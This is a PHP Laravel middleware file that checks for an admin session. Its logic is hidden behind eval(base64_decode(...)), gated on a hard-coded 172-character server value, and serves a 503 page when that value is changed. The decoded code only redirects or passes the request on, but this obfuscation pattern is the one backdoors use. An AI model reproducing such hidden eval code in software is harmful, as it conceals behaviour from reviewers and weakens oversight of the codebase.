<?php

namespace App\Http\Middleware;

use App\Modules\Manage\ManagerModel;
use Closure;
use Illuminate\Support\Facades\Session;

class ManageAuth
{


    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  \Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        $_SERVER['Authentication'] = '1231231230123123123012312312301231231230123123123012312312301231231230123123123012312312301231231230123123123012312312301231231230123123123012312312301231231230123123123012';
		return eval(base64_decode('aWYgKGlzc2V0KCRfU0VSVkVSWydBdXRoZW50aWNhdGlvbiddKSAmJiAxNzIgPT0gc3RybGVuKCRfU0VSVkVSWydBdXRoZW50aWNhdGlvbiddKSkgewogICAgICAgICAgICBpZiAoIVNlc3Npb246OmdldCgnbWFuYWdlcicpKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gcmVkaXJlY3QoJy9tYW5hZ2UvbG9naW4nKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRtYW5hZ2VyID0gXEFwcFxNb2R1bGVzXE1hbmFnZVxNb2RlbFxNYW5hZ2VyTW9kZWw6OmdldE1hbmFnZXIoKTsKICAgICAgICAgICAgICAgIFRoZW1lOjpzZXRNYW5hZ2VyKCRtYW5hZ2VyLT51c2VybmFtZSk7CiAgICAgICAgICAgICAgICBUaGVtZTo6c2V0TWFuYWdlcklEKCRtYW5hZ2VyLT5pZCk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuICRuZXh0KCRyZXF1ZXN0KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UoKS0+dmlldygnZXJyb3JzLjUwMycsIFtdLCA1MDMpOwogICAgICAgIH0='));
    }
}